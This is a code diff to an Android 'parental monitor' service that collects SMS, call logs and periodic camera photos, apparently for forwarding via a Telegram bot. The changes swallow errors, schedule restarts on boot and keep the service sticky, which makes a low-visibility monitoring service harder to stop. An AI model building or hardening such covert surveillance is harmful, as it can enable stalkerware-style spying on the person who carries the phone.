@@ -155,7 +155,15 @@ class MonitoringService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        preferencesManager = PreferencesManager.getInstance(this)
+        try {
+            preferencesManager = PreferencesManager.getInstance(this)
+        } catch (_: Exception) {
+            try {
+                stopSelf()
+            } catch (_: Exception) {
+            }
+            return
+        }
         startForegroundImmediate()
         try {
             Thread {
@@ -170,6 +178,7 @@ class MonitoringService : Service() {
         } catch (_: Exception) {
         }
         credsListener = android.content.SharedPreferences.OnSharedPreferenceChangeListener { _, key ->
+            try {
             if (key == PreferencesManager.KEY_BOT_TOKEN || key == PreferencesManager.KEY_CHAT_ID) {
                 refreshCreds()
                 if (key == PreferencesManager.KEY_BOT_TOKEN) {
@@ -190,12 +199,26 @@ class MonitoringService : Service() {
             if (key == PreferencesManager.KEY_CAMERA_INTERVAL || key == PreferencesManager.KEY_MONITORING_PAUSED || key == PreferencesManager.KEY_PHOTO_PAUSED_UNTIL || key == PreferencesManager.KEY_SYNC_INTERVAL || key == PreferencesManager.KEY_PATROL_ENABLED || key == PreferencesManager.KEY_PATROL_INTERVAL) refreshLoopConfig()
             if (key == PreferencesManager.KEY_CAMERA_INTERVAL || key == PreferencesManager.KEY_MONITORING_PAUSED || key == PreferencesManager.KEY_PHOTO_PAUSED_UNTIL) restartCameraLoop()
             if (key == PreferencesManager.KEY_PATROL_ENABLED || key == PreferencesManager.KEY_PATROL_INTERVAL) restartPatrolLoop()
+            } catch (_: Exception) {
+            }
         }
         try { credsListener?.let { preferencesManager.registerChangeListener(it) } } catch (_: Exception) { }
-        smsRepository = SmsRepository(this)
-        callLogRepository = CallLogRepository(this)
-        messageQueue = MessageQueue.getInstance(this)
-        cameraService = CameraService(this)
+        try {
+            smsRepository = SmsRepository(this)
+            callLogRepository = CallLogRepository(this)
+            messageQueue = MessageQueue.getInstance(this)
+            cameraService = CameraService(this)
+        } catch (_: Exception) {
+            try {
+                MessageScheduler.scheduleBootRestart(this)
+            } catch (_: Exception) {
+            }
+            try {
+                stopSelf()
+            } catch (_: Exception) {
+            }
+            return
+        }
         try {
             val pending = preferencesManager.pendingMsgDrops
             if (pending > 0) {
@@ -280,8 +303,12 @@ class MonitoringService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startForegroundImmediate()
-        when (intent?.action) {
+        try {
+            startForegroundImmediate()
+        } catch (_: Exception) {
+        }
+        return try {
+            when (intent?.action) {
             ACTION_START_MONITORING -> {
                 startMonitoring()
                 return START_STICKY
@@ -298,6 +325,10 @@ class MonitoringService : Service() {
                     return START_NOT_STICKY
                 }
             }
+            }
+            START_STICKY
+        } catch (_: Exception) {
+            START_STICKY
         }
     }
 
@@ -371,8 +402,11 @@ class MonitoringService : Service() {
         val notificationBuilder = NotificationCompat.Builder(this, ParentalMonitorApp.CHANNEL_ID)
             .setSmallIcon(R.drawable.ic_notification)
             .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setContentIntent(setupTapIntent())
             .setOngoing(true)
+        try {
+            notificationBuilder.setContentIntent(setupTapIntent())
+        } catch (_: Exception) {
+        }
         
         if (com.redeye.parentalmonitor.BuildConfig.DEBUG) {
             // DEBUG: Show detailed notification
